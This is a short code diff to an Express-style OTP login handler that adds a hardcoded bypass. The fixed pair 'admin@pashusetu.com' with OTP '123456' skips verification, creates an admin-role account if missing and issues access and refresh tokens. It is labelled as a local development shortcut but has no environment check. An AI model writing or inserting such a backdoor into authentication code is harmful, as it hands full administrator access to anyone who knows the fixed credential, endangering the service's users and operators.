@@ -79,6 +79,29 @@ exports.verifyOtp = asyncHandler(async (req, res, next) => {
   email = email.trim().toLowerCase();
   otp = otp.trim();
 
+  // Special admin local dev auto-login bypass
+  if (email === 'admin@pashusetu.com' && otp === '123456') {
+    let user = await User.findOne({ email });
+    if (!user) {
+      user = await User.create({
+        email,
+        name: 'Admin Nilesh',
+        role: 'admin'
+      });
+    }
+    const accessToken = generateToken({ id: user._id, role: user.role });
+    const refreshToken = generateRefreshToken({ id: user._id });
+    return res.status(200).json({
+      status: 'success',
+      message: 'Logged in successfully',
+      data: {
+        user,
+        accessToken,
+        refreshToken
+      }
+    });
+  }
+
   // 2. Fetch the latest OTP record for this email
   const otpRecord = await Otp.findOne({ email }).sort({ createdAt: -1 });
 
